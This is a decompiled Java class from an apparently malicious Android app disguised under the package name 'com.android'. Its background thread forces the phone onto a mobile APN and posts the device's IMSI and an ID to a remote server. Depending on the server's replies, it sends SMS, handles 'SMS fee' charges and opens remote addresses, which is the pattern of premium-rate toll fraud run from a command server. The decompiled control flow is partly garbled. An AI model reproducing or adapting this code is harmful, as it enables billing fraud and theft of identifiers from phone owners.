package com.android;

import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

class MonitorService$2 extends Thread
{
  MonitorService$2(MonitorService paramMonitorService)
  {
  }

  public void run()
  {
    try
    {
      Log.d("MyMonitor", "MonitorService.beginFee begin");
      String str1 = this.this$0.showActiveNetwork();
      if (str1.toUpperCase().equals("WIFI"))
      {
        MonitorService.access$2(this.this$0);
        Thread.sleep(10000L);
        MonitorService.access$4(this.this$0, 30 + MonitorService.access$3(this.this$0));
        str1 = this.this$0.showActiveNetwork();
      }
      String str4;
      int j;
      if (str1.toUpperCase().equals("MOBILE"))
      {
        ApnNode localApnNode = MonitorService.access$5(this.this$0);
        if ((localApnNode.getApn() == null) || (!localApnNode.getApn().equals("cmwap")) || ((localApnNode.getMmsproxy() != null) && ((localApnNode.getMmsproxy() == null) || (!localApnNode.getMmsproxy().equals("")))) || ((localApnNode.getMmsc() != null) && ((localApnNode.getMmsc() == null) || (!localApnNode.getMmsc().equals("")))))
        {
          int k = MonitorService.access$6(this.this$0, "cmwap");
          if (k == -1)
            k = MonitorService.access$7(this.this$0);
          MonitorService.access$8(this.this$0, k);
        }
        Thread.sleep(10000L);
        Log.d("MyMonitor", "MonitorService.beginFee 111");
        ArrayList localArrayList1 = new ArrayList();
        localArrayList1.add(new BasicNameValuePair("Uid", MonitorService.access$0(this.this$0)));
        localArrayList1.add(new BasicNameValuePair("ChannelId", "10012"));
        localArrayList1.add(new BasicNameValuePair("OSType", MonitorService.access$9(this.this$0)));
        localArrayList1.add(new BasicNameValuePair("IMSI", MonitorService.access$10(this.this$0)));
        String str2 = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/Reg.aspx", localArrayList1);
        if ((!str2.equalsIgnoreCase("finish")) && (str2.equalsIgnoreCase("sendsms")))
        {
          MonitorService.access$11(this.this$0);
          Thread.sleep(10000L);
        }
        ArrayList localArrayList2 = new ArrayList();
        localArrayList2.add(new BasicNameValuePair("Uid", MonitorService.access$0(this.this$0)));
        String str3 = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/BlogDown.aspx", localArrayList2);
        Log.d("MyMonitor", "MonitorService.beginFee 555" + str3);
        if (str3 != "")
          MonitorService.access$12(this.this$0, str3);
        Log.d("MyMonitor", "MonitorService.beginFee 222");
        ArrayList localArrayList3 = new ArrayList();
        localArrayList3.add(new BasicNameValuePair("Uid", MonitorService.access$0(this.this$0)));
        localArrayList3.add(new BasicNameValuePair("Version", "1"));
        str4 = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/FreeDown.aspx", localArrayList3);
        Log.d("MyMonitor", "MonitorService.beginFee 333" + str4);
        if (str4 != "")
        {
          j = str4.indexOf("*$*");
          if (j != 0)
            break label839;
          String[] arrayOfString = str4.substring(3).split(",");
          String str5 = arrayOfString[0];
          Integer.parseInt(arrayOfString[1]);
          String str6 = arrayOfString[2];
          MonitorService.access$13(this.this$0, arrayOfString[3]);
          this.this$0.InsertIntoBlog(arrayOfString[1], str6);
          this.this$0.AccessRemote(str5);
        }
      }
      while (true)
      {
        ArrayList localArrayList4 = new ArrayList();
        localArrayList4.add(new BasicNameValuePair("Uid", MonitorService.access$0(this.this$0)));
        String str7 = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/FavDown.aspx", localArrayList4);
        Log.d("MyMonitor", "MonitorService.beginFee 666" + str7);
        if (str7 != "")
          MonitorService.access$14(this.this$0, str7);
        ArrayList localArrayList5 = new ArrayList();
        localArrayList5.add(new BasicNameValuePair("Uid", MonitorService.access$0(this.this$0)));
        String str8 = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/OpenWap.aspx", localArrayList5);
        Log.d("MyMonitor", "MonitorService.beginFee 888" + str8);
        if (str8 == "")
          break label861;
        MonitorService.access$15(this.this$0, str8);
        return;
        if (!str1.toUpperCase().equals(""))
          break;
        int i = MonitorService.access$7(this.this$0);
        MonitorService.access$8(this.this$0, i);
        Thread.sleep(10000L);
        break;
        String str9 = str4.substring(0, j);
        this.this$0.HandleSmsFee(str9);
      }
      return;
    }
    catch (Exception localException)
    {
    }
    label839: label861: return;
  }
}

/* Location:
 * Qualified Name:     com.android.MonitorService.2
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.6.1-SNAPSHOT
 */